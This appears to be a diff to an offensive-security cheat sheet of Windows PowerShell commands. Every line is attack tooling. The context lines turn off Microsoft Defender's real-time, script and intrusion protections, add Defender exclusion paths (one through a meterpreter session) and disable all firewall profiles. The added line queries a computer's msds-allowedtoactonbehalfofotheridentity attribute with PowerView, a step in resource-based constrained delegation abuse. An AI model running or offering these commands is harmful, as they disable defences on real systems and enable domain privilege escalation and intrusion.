@@ -5,5 +5,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 powershell -a "Add-MpPreference -ExclusionPath C:\windows\tasks"
 execute -Hf powershell -a "Add-MpPreference -ExclusionPath C:\windows\tasks" // meterpreter
 
+$RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+
 Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
